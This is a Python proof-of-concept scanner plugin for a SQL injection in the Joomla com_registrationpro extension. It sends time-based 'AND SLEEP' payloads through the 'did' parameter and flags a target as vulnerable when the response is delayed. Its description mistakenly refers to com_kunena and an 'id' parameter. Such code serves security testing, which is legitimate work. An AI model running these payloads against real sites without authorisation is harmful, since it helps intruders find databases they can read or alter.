# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Joomla_0052'  # 平台漏洞编号
    name = 'Joomla com_registrationpro插件did参数SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-04-11'  # 漏洞公布时间
    desc = '''
    Joomla com_kunena插件'id'参数存在SQL注入漏洞。攻击者可利用漏洞访问或修改数据库数据。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-04218'
    cnvd_id = 'CNVD-2017-04218'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Joomla com_registrationpro 1.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '156da297-b04d-4700-8b3f-b29a18658657'  # 平台 POC 编号
    author = '国光'  # POC编写者s
    create_date = '2018-08-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload1 = "/index.php?option=com_registrationpro&view=event&did=1 AND SLEEP(1)&Itemid=1&shw_attendees=0"
            payload2 = "/index.php?option=com_registrationpro&view=event&did=1 AND SLEEP(6)&Itemid=1&shw_attendees=0"
            vul_url1 = arg + payload1
            vul_url2 = arg + payload2

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }

            # 开始记录请求时间
            start_time = time.time()
            response1 = requests.get(vul_url1, headers=headers)
            # 记录正常请求并收到响应的时间
            end_time_1 = time.time()

            # 记录延时sleep后的时间
            response2 = requests.get(vul_url2, headers=headers)
            end_time_2 = time.time()
            self.output.info("正在构造SQL注入测试语句")
            # 计算时间差
            delta1 = end_time_1 - start_time
            delta2 = end_time_2 - end_time_1

            if (delta2 - delta1) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
